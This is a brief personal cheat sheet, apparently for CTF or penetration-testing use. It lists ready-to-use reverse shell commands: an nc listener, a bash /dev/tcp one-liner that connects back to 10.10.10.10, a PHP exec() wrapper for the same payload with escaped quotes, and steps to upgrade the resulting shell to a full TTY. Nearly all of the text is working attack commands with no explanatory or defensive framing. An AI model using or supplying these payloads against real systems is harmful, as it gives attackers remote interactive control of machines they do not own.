# Reverse Shell


listen with `nc`
`nc -lnvp 4444`

Know my ip: `	`

# Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# PHP - Bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'");
may have to scape the quotes
exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'\");








# estabilize shell?

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
```


```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
```